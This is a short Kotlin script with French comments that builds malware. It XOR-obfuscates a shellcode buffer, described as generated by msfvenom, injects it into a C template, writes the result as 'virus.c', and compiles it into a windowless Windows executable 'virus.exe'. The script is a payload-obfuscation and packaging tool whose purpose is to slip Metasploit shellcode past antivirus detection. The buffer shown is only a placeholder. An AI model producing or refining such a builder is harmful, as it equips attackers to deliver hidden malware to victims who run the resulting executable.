#!/usr/bin/env kotlinc -script

import java.io.File

// Buffer généré par msfvenom
val originalBuffer = byteArrayOf(0xde.toByte(), 0xad.toByte(), 0xbe.toByte(), 0xef.toByte())
val bufferLen = originalBuffer.size

// Obfusque le buffer
val buffer = ByteArray(bufferLen)
for (i in 0 until bufferLen) {
  buffer[i] = (originalBuffer[i].toInt() xor 42).toByte()
}

// Transforme le buffer en chaîne C
val bufferString = buildString {
  for (b in buffer) {
    append("\\x%02x".format(b))
  }
}

// Génère le code C à partir de base.c en remplaçant <BUF> et <BUFLEN>
val baseFile = File("base.c")
val base = baseFile.readText()
val replaced = base.replace("<BUF>", bufferString).replace("<BUFLEN>", bufferLen.toString())

val outputFile = File("virus.c")
outputFile.writeText(replaced)

// Compilation du code généré en .exe
val compileCommand = "x86_64-w64-mingw32-gcc -mwindows -Wall virus.c -o virus.exe"
val process = Runtime.getRuntime().exec(compileCommand)
process.waitFor()
